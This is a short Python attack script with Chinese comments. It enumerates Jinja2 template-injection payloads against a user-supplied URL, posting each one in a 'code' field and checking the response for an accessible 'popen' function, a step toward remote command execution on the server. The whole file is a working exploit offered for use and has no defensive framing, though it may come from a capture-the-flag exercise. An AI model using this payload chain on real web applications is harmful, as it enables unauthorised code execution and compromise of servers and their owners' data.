import requests

url = input("url: ")

for i in range(300):
    try:
        # 布尔盲注：如果类存在就返回内容，不存在就返回空
        payload = f'{{{{ "".__class__.__bases__[0].__subclasses__()[{i}].__init__.__globals__.get("popen") if "".__class__.__bases__[0].__subclasses__()[{i}].__init__ else "" }}}}'
        data = {"code": payload}

        response = requests.post(url, data=data, timeout=5)

        # 检查响应中是否包含函数对象（表示存在）
        if "built-in method" in response.text or "function" in response.text:
            print(f"[+] 索引 {i} 可用 - 包含 popen 函数")
        else:
            pass
    except Exception as e:
        pass
